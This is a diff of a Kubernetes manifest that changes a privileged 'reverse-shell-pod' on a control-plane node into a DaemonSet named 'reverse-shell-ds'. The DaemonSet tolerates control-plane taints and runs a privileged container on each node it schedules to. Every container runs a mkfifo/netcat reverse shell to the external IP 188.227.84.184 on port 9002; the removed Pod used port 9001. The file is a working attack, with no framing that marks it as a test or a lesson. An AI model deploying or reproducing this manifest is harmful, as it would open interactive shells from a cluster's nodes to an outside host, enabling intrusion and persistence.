@@ -1,16 +1,26 @@
-apiVersion: v1
-kind: Pod
+apiVersion: apps/v1
+kind: DaemonSet
 metadata:
-  name: reverse-shell-pod
+  name: reverse-shell-ds
 spec:
-  nodeSelector:
-    node-role.kubernetes.io/control-plane: ""
-  containers:
-  - name: shell-container
-    image: alpine
-    command: ["/bin/sh", "-c"]
-    securityContext:
-      privileged: true
-    args:
-    - |
-      rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 188.227.84.184 9001 >/tmp/f
+  selector:
+    matchLabels:
+      name: reverse-shell
+  template:
+    metadata:
+      labels:
+        name: reverse-shell
+    spec:
+      tolerations:
+      - key: node-role.kubernetes.io/control-plane
+        operator: Exists
+        effect: NoSchedule
+      containers:
+      - name: shell
+        image: alpine
+        securityContext:
+          privileged: true
+        command: ["/bin/sh", "-c"]
+        args:
+        - |
+          rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 188.227.84.184 9002 >/tmp/f
